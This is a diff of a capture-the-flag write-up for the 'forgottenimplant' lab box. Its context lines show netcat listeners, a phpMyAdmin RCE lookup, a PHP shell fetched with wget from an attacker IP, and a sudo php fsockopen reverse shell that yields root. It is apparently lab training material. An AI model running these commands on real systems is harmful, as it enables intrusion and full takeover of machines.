@@ -38,7 +38,7 @@ We run Wireshark and listen on our VPN at `tun0`, killing any leftover nmap sess
 
 Let’s start a netcat listener to give it something to connect to:
 
-```bash
+```console
 ──(user㉿kali-linux-2022-2)-[~]
 └─$ nc -lvp 81
 listening on [any] 81 ...
@@ -71,7 +71,7 @@ We're receiving an HTTP GET call to a `heartbeat` endpoint and a long filename t
 
 Let's start an HTTP server so that we can respond to the GET. 
 
-```bash
+```console
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ python -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
@@ -91,7 +91,7 @@ Soon after starting the server we see calls coming in for the  `heartbeat` endpo
 
 To begin interacting with the box, we'll host a file at `/get-job/ImxhdGVzdCI=` for the implant to pull. We'll seed it with a `ls` command to start.
 
-```bash
+```console
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ mkdir get-job
 
@@ -310,7 +310,7 @@ if __name__ == "__main__":
 
 Enumerating fi’s home directory we can see that he has `sudo` permissions. This looks like a good account to transition to if we can find a path. 
 
-```bash
+```console
 ada@forgottenimplant:/home/fi$ ls -la
 
 total 148
@@ -351,7 +351,7 @@ There are (at least) two paths we can take from here, lets examine both.
 
 A quick search identifies an RCE for our version of phpMyAdmin. 
 
-```bash
+```console
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ searchsploit   phpmyadmin 4.8.1                                                                           
 ------------------------------------------------------------------------------ ---------------------------------
@@ -382,7 +382,7 @@ In most challenges we’re trying to elevate *out* of the www-data account, lets
 
 Enumerating `/var/www/phpmyadmin` we see we can write to the `tmp` folder:
 
-```bash
+```console
 cd phpmyadmin/
 ada@forgottenimplant:/var/www/phpmyadmin$ ls -la
 
@@ -412,7 +412,7 @@ If we can access this through the web server we'll be able to run code as www-da
 
 Lets create a file and try to call it through `curl` as a quick test to prove that the folder is accessible:
 
-```bash
+```console
 ada@forgottenimplant:/var/www/phpmyadmin$ echo "hello" > tmp/hi.html
 
 ada@forgottenimplant:/var/www/phpmyadmin$ curl 127.0.0.1/tmp/hi.html
@@ -422,7 +422,7 @@ hello
 
 Looks good. Let’s start a new listener, upload a PHP shell and trigger it with `curl`:
 
-```bash
+```console
 ada@forgottenimplant:/var/www/phpmyadmin/tmp$ wget 10.6.74.177/shell.php
 
 --2023-08-02 22:32:12--  http://10.6.74.177/shell.php
@@ -444,7 +444,7 @@ With the above we receive a connection back to our new listener as www-data.
 
 A quick enumeration proves that our migration to www-data was worthwhile, this account has full `sudo` permissions with no password needed. 
 
-```bash
+```console
 $ sudo -l
 Matching Defaults entries for www-data on forgottenimplant:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -461,7 +461,7 @@ www-data@forgottenimplant:/$ sudo php -r '$sock=fsockopen("10.6.74.177",4447);ex
 
 Finally we see that beautiful hashtag prompt!
 
-```bash
+```console
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ nc -lvp 4447
 listening on [any] 4447 ...
